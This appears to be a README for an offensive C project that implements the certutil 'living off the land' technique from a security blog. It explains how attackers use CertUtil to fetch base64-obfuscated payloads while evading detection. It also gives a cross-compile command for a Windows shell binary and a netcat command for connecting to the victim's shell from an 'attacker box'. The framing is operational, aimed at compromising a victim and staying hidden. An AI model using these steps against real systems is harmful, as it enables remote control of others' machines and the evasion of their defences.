#IMPLEMENTATION OF https://www.sentinelone.com/blog/malware-living-off-land-with-certutil/ IN C PROGRAMMING LANGUAGE
One tactic that has become increasingly popular to achieve stealth is ‘living off the land’. This involves using tools natively found on the victim’s device to achieve some or all of the attacker’s purposes while at the same time reducing the attacker’s exposure and risk of detection.
CertUtil.exe is an admin command line tool intended by Microsoft to be used for manipulating certification authority (CA) data and components. This includes verifying certificates and certificate chains, dumping and displaying CA configuration information and configuring Certificate Services.

How Attackers Use CertUtil
CertUtil can replace PowerShell for specific tasks such as downloading a file from a remote URL and encoding and decoding a Base64 obfuscated payload.
In order to avoid detection by security software scanning for malicious strings, the attacker firsts encodes a file with base64 and then engineers a way to download it to a location on the victim’s device.

Compile winshell.c
sudo i686-w64-mingw32-gcc winshell.c -o winshell.exe


Connect Windows shell from attacker box(Linux Machine)
nc -nv 0.0.0.0 4444
